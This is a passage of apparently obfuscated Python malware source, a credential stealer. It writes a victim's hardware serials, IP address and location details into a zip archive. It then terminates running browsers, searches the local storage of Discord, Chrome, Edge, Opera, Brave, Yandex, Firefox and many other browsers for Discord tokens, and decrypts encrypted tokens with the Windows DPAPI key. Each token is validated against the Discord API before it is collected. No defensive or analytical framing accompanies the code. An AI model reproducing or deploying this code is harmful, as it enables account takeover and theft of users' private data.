 - Processor Serial Number   : {MIZIJORYJUNOUJIOAWRGNSZDIWFMJPUAITHQQZJUBQOOJXWEVIIRHQLHZWQJCVVRJINRVEWYXWHDHSPGVDGPWOP}
 - Bios Serial Number        : {OAWIEIXKGOUBZZZDCFNSWDPEJCSFQDTBLQDFLOXDRXCFGFQINXPJOFMYARWWOOTJBDEOTIRLZDPYRNWPTRCYXASFZXAX}
 - Bios Release Date         : {CYSIOWISPCMDLRZGRNDTMCIVWYATWZHPPEUGJLAYBYKEMGNRKUALOVTPGYOMMMKYSOHIES}
 - Bios Version              : {LFMZCIMHFHWNKTWKZQHMWGLAAXJWWZTKFWJFFIOCVPGKNMTSMLVJVWLNLWGOBTJM}
 - System Bios Version       : {PILQQTDOJGXSTKHUXDWUXYBPPJLTVTALJWOWLVHKTBIUTDIBKJNMNABLEVNFCNNMIBNXLUZYMQBRYFBIWLW}
 - System Version            : {ONKNFPHQVAQHMPTOXOTRFCGEIYXCSLESOLAVCMJABAOKYZSCKOVKPRPSHDOPBWTOASFANLBNIAQYDBKOVEIBBWNINVYSMQNYUJ}
 - System Family             : {OLTQFFHNFWDEAJDXPNFFKWJJTODXDGSOPJYBMZEDHIYGAXCHWQCUEWBWECRRSNHYNII}
 - System Manufacturer       : {JIDXFDIOCFLQMVUREHMWWJIFLFGIZPOGLUICMIYVZPECTXHBTYSSEXKPMVVNZBEPTZIZGIQPKOTZJTPRQZQTUGXPMYCCMQSVUG}
 - System Product            : {WNCBKCAJMMUOWLVCRTGDFGURVRFGKADGLOLJOCZDMTBKKRMYURRPGGMJYKARFKEKSLVPPPNSQXMCCUHWCNUJUKO}
 - System SKU                : {WXZVBZALHCZMPZPCBBMJBZBUEKDPOTPUHUYTMUMXAJFVTFAAWERCPOCGHSJPPLGFAEFFGZQHHSDYACZOKAXGRFXZ}
 - Oem String Serial Number  : {YGPPNUKSVJQGAGNOIVHDXQFNKZUCALYAZYVPKLVFLSWPUDBQYXYSBWGFWRXM}
 - Asset Tag Serial Number   : {ISEHWBCJBXLWWPEVIRQEQIOCHNIQODXCWJFTEVBGQEEQRRVIGPTRNXXQIOIYZFVQYAZKMRURWXNSZOQBXUUT}

Ip:
 - Public : {LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK}
 - Local  : {WNXYILYQOUEISQJRNUZDUHWRMINOATIHTYVXRUFXUPWXCHWKPWBPBZHVBURZBMOJSWOAFVHFTZVV}

Ip Information:
 - Isp : {QBRPJDJTUBPQBGXMJNHMDVFEDVQTPIEZMELOWNTFFNDHPRYUIBFSWOABNWGJCPIAMXKTIHWMZNZYZWKQLE}
 - Org : {RMZEIFLXIULAXDTVOIKFOCSUCQSKWAJZSXWVRNBKGIDFVHXIPZJEXFDEUUURZIVYCLAFKDHCBVSAXBPLOHNQ}
 - As  : {AGYJJKJJXNNPMCAHHLINWJKEDEAPQOCIJEUBKPZYIGTWZQDMCQT}

Ip Location:
 - Country   : {WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE} ({WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE_code})
 - Region    : {CUYWHUIMMRPRPRSAYZADKYIVPVGXLGZWELNNNUWTLMRNPBXETDUVTZCRCNFNCIAEPMIDTVQGZKR} ({CUYWHUIMMRPRPRSAYZADKYIVPVGXLGZWELNNNUWTLMRNPBXETDUVTZCRCNFNCIAEPMIDTVQGZKR_code})
 - Zip       : {DPERSAVPQJWNVVVBUFFJHLVVPNKDMWCLRIFTSVVZMPWKEXIPNFZPSWEEMMDIRYGFICFZACLUIWNS}
 - City      : {KIJMOZRKQUWQZNDIYRHWLEDAETCQBHIYFLJWJZGYUOVBVPRDXYRMORBIXIVIAXUGZKYKXIVEYF}
 - Timezone  : {STWCFHQJUOJIWNVNNMDFLUOFNCIJBQOIJZPXPCLVMEKSLJNASYDFJAQXCJZFTCESVSBYRRLNEMRVHOXCVXYSVAXOVEJTGPMKKS}
 - Longitude : {RYYXVDSDAUDYIKWFSJJFQUIVUUMDWCIJUGHJFHUNBKDEFCZUZVRYMAANQHYNYXAD}
 - Latitude  : {GAOQESZMFZKMQBQYDHKDLUNWHTQTNHRUHOWHOTAXKEXBCVLDSNZDTQMWVZSIMXLMJOQFKJCFZUVFQEJTJQWGMDFBVKUNPVLAWLW}
"""
    KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr("System Info.txt", OFICAEUBYOBZNTEXNAUCZYRMCNFQYRDCXEHUPJRACACIQBCYADCCPHAX)

    return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info

def LFWBQOTYUYEAWXBQUACEETELSYTQUUSUTCAEAYHXDVDZIJTAUCTJCLYXMZKVZZAPU(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    UUCQZJNKJZCOOGUITJPOTLLLJRGNIJAZHMQJDJAOIXHOWEYIVQYFUOWLLFKRCZFRZRRZITKROZLDGLFTCUGFRMDMXHS = ""
    TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS = 0

    def FZLBBFQVFIHIPWFTSQQXBSRBORXHUYYNONXINWPULAKOCGQWUZGSBGIDCYOV():  
        OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX = "https://discord.com/api/v9/users/@me"
        NWPIWWWLOGQNXECJMDLXCQDESLPJGTDZECDVYAUCHNSRMDULVXLTWXPFXUYDDBI = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        NWPIWWWLOGQNXECJMDLXCQDESLPJGTDZECDVYAUCHNSRMDULVXLTWXPFXUYDDBI_enc = r"dQw4w9WgXcQ:[^\"]*"
        AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM = []
        WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ = []
        DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW = {}

        LQQVHUBXUBDWTOOVJNVBOLSBTOFWZSABXDKAUFHTLEPNUSDAVFTYNYNMTRTVBMNQKWE = [
            ("Discord",                os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_proc_name in LQQVHUBXUBDWTOOVJNVBOLSBTOFWZSABXDKAUFHTLEPNUSDAVFTYNYNMTRTVBMNQKWE:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_proc_name in LQQVHUBXUBDWTOOVJNVBOLSBTOFWZSABXDKAUFHTLEPNUSDAVFTYNYNMTRTVBMNQKWE:
            if not os.path.exists(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):

                continue
            QFSKKESIOFHOTVBXYSTVXSYDOGBHBXSHHLJBOQIYRQHQXAXKCRHSFZJYNJPCPPTDABIZEYLEGKJIKRCSKCRQQZJ = VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO.replace(" ", "").lower()
            if "cord" in BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ:
                if not os.path.exists(os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, QFSKKESIOFHOTVBXYSTVXSYDOGBHBXSHHLJBOQIYRQHQXAXKCRHSFZJYNJPCPPTDABIZEYLEGKJIKRCSKCRQQZJ, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI = os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_file_name)
                    if os.path.exists(WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI):
                        with open(WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(NWPIWWWLOGQNXECJMDLXCQDESLPJGTDZECDVYAUCHNSRMDULVXLTWXPFXUYDDBI_enc, v4r_line.strip()):
                                    HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS = LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), MTAZZWJNTARMXPZECPXKXKTDCOLQJXYMOPDLYRYWQYPZXQKYDAWFDSHUSYYNPUOTDVLXDQYZAUGVKTOGTRQ(os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, QFSKKESIOFHOTVBXYSTVXSYDOGBHBXSHHLJBOQIYRQHQXAXKCRHSFZJYNJPCPPTDABIZEYLEGKJIKRCSKCRQQZJ, 'Local State')))
                                    if KUJTIFXMUFSLZFAXQMGUSZBHGUXXNBTASLBROKVEOKFKGQWHII(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS, OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX):
                                        XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE = requests.get(OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX, headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS}).json()['id']
                                        if XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE not in WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ:
                                            AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM.append(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS)
                                            WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ.append(XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE)
                                            DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW[HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS] = (VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI)
            else:
                for v4r_file_name in os.listdir(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI = os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_file_name)
                    if os.path.exists(WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI):
                        with open(WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS in re.findall(NWPIWWWLOGQNXECJMDLXCQDESLPJGTDZECDVYAUCHNSRMDULVXLTWXPFXUYDDBI, v4r_line.strip()):
                                    if KUJTIFXMUFSLZFAXQMGUSZBHGUXXNBTASLBROKVEOKFKGQWHII(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS, OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX):
                                        XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE = requests.get(OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX, headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS}).json()['id']
                                        if XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE not in WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ:
                                            AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM.append(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS)
                                            WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ.append(XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE)
                                            DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW[HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS] = (VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, WXPBQFXVBHCXMRWIWOKMCVSMGDRKEYIPORECSWWEYBIKABYMZATMBJMAXOI)

        if os.path.exists(os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Mozilla", "Firefox", "Profiles")):
            for BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, _, v4r_files in os.walk(os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS in re.findall(NWPIWWWLOGQNXECJMDLXCQDESLPJGTDZECDVYAUCHNSRMDULVXLTWXPFXUYDDBI, v4r_line.strip()):
                                    if KUJTIFXMUFSLZFAXQMGUSZBHGUXXNBTASLBROKVEOKFKGQWHII(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS, OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX):
                                        XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE = requests.get(OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX, headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS}).json()['id']
                                        if XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE not in WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ:
                                            AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM.append(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS)
